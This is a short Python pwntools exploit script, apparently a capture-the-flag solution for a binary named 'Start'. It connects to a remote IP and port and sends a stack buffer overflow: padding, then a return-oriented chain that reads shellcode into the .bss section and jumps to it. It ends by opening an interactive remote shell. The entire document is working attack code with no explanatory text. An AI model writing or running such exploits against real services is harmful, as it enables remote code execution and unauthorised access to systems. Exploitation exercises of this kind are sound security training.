#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

context.arch = "amd64"
elf = ELF("./Start")

r = remote("139.59.114.220", 10001)

sc = asm(shellcraft.sh())

pop_rsi_r15 = 0x4005c1
pop_rdi = 0x4005c3

r.send(("A" * 24 + flat([
    pop_rdi, 0, pop_rsi_r15, elf.bss(), 0, elf.plt["read"],
    elf.bss()
])).ljust(1024, "a"))

sleep(0.1)
r.send(sc)

r.interactive()
